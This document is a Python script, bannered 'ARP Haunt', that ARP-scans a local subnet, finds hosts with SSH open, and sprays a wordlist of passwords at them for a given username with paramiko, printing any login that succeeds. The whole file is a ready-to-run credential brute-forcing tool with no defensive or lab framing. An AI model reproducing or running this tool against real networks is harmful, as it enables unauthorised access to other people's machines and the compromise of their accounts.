#!/usr/bin/env python3

import scapy.all as scapy
import os
import sys
import socket
import paramiko
from datetime import datetime

class stl():
    BLK = '\033[30m'
    RED = '\033[31m'
    GRN = '\033[32m'
    YLW = '\033[33m'
    BLU = '\033[34m'
    MGN = '\033[35m'
    CYN = '\033[36m'
    WHT = '\033[37m'
    UNDR = '\033[4m'
    RST = '\033[0m'

trim0 = "═" * 54

print(f"""
{stl.MGN}╔{trim0}╗{stl.RST}
{stl.MGN}║{stl.RED}     ▄▄▄· ▄▄▄   ▄▄▄·     ▄ .▄ ▄▄▄· ▄• ▄▌ ▐ ▄ ▄▄▄▄▄    {stl.MGN}║{stl.RST}
{stl.MGN}║{stl.RED}    ▐█ ▀█ ▀▄ █·▐█ ▄█    ██▪▐█▐█ ▀█ █▪██▌•█▌▐█•██      {stl.MGN}║{stl.RST}
{stl.MGN}║{stl.RED}    ▄█▀▀█ ▐▀▀▄  ██▀·    ██▀▐█▄█▀▀█ █▌▐█▌▐█▐▐▌ ▐█.▪    {stl.MGN}║{stl.RST}
{stl.MGN}║{stl.RED}    ▐█ ▪▐▌▐█•█▌▐█▪·•    ██▌▐▀▐█ ▪▐▌▐█▄█▌██▐█▌ ▐█▌·    {stl.MGN}║{stl.RST}
{stl.MGN}║{stl.RED}     ▀  ▀ .▀  ▀.▀       ▀▀▀ · ▀  ▀  ▀▀▀ ▀▀ █▪ ▀▀▀     {stl.MGN}║{stl.RST}
{stl.MGN}╚{trim0}╝{stl.RST}
""")

if os.geteuid() != 0:
    sys.exit(f"[{stl.RED}-{stl.RST}] Must run as suP3rStaR(SUDO)!!!!11")

target_ip = input(f"[{stl.BLU}*{stl.RST}] IP range (192.168.0.0/24): ") or "192.168.0.0/24"
port = int(input(f"[{stl.BLU}*{stl.RST}] Port (22): ") or 22)
list = input(f"[{stl.BLU}*{stl.RST}] wordlist (funlist): ") or "funlist"
username = input(f"[{stl.BLU}*{stl.RST}] username (h4x3r666): ") or "h4x3r666"
wordlist = open(list)

def scan(ip):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{stl.BLU}*{stl.RST}] Starting ARP scan on {ip} : {port} with {username} & {list} at {stl.CYN}{timestamp}{stl.RST}\n")
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    results = []
    for element in answered_list:
        result = {"ip": element[1].psrc, "mac": element[1].hwsrc}
        results.append(result)
    return results

def check_port(ip, port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.settimeout(2)
        try:
            result = sock.connect_ex((ip, port))
            return result == 0
        except socket.error as e:
            print(f"[{stl.RED}-{stl.RST}] Error checking {ip}:{port} - {e}")
            return False

def attempt_ssh_login(ip, port, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(ip, port, username, password)
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{stl.GRN}+{stl.RST}] Success! {stl.GRN}{username}{stl.RST} + {stl.GRN}{password}{stl.RST} logged in {ip}:{port} at {stl.CYN}{timestamp}{stl.RST}")
        ssh.close()
        return True
    except paramiko.AuthenticationException:  
        print(f"[{stl.RED}-{stl.RST}] {ip}:{port} {username} & {password}\tNo joy!")
    except socket.timeout:
        print(f"[{stl.RED}-{stl.RST}] Timeout connecting to {ip}:{port}.")
    ssh.close()
    return False

def display_results(results, port):
    for result in results:
        ip = result["ip"]
        mac = result["mac"]
        print(f"[{stl.BLU}*{stl.RST}] IP: {ip}\t\t\t MAC: {mac}")
        if check_port(ip, port):
            with open(list, 'r') as fp:
                lines = len(fp.readlines())
            print(f"[{stl.GRN}*{stl.RST}] Found open! {ip}:{port} Spraying with username {stl.BLU}{username}{stl.RST} & {stl.BLU}{list}{stl.RST} ({lines} lines) wordlist.")
            try:
                with open(list, 'r') as wordlist:
                    for password in wordlist.readlines():
                        password = password.strip("\n")
                        if attempt_ssh_login(ip, port, username, password):
                            break
            except Exception as e:
                print(f"[{stl.RED}-{stl.RST}] Error processing IP {ip}: {e}")

scan_results = scan(target_ip)
display_results(scan_results, port)
